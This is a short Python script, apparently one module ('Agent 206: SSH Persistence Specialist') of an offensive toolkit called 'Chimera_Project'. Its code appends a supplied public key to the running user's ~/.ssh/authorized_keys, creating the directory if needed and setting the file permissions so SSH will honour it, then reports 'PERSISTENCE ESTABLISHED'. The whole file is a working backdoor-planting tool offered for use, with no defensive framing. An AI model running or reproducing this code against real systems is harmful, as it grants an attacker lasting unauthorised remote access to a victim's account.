#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
from datetime import datetime

class SSHKeySwapper:
    """
    Agent 206: SSH Persistence Specialist.
    Injects a persistent public key into the target user's authorized_keys.
    """
    def __init__(self, public_key_string):
        self.pub_key = public_key_string.strip()
        self.ssh_dir = os.path.expanduser("~/.ssh")
        self.auth_file = os.path.join(self.ssh_dir, "authorized_keys")

    def execute(self):
        print(f"--- [AGENT 206: SSH KEY INJECTION] ---")
        try:
            # 1. Ensure .ssh directory exists
            if not os.path.exists(self.ssh_dir):
                os.makedirs(self.ssh_dir, mode=0o700)
                print("[*] Created .ssh directory.")

            # 2. Check if key already exists to avoid duplication
            if os.path.exists(self.auth_file):
                with open(self.auth_file, 'r') as f:
                    if self.pub_key in f.read():
                        print("[+] Key already present. Persistence confirmed.")
                        return True

            # 3. Append the key
            with open(self.auth_file, 'a') as f:
                f.write(f"\n{self.pub_key}\n")
            
            # 4. Set strict permissions (SSH will ignore the file if too open)
            os.chmod(self.auth_file, 0o600)
            print("[!!!] PERSISTENCE ESTABLISHED: Public key injected.")
            return True
        except Exception as e:
            print(f"[!] Injection Failed: {e}")
            return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: ./main.py '<ssh-rsa ...>'")
        sys.exit(1)
    
    SSHKeySwapper(sys.argv[1]).execute()
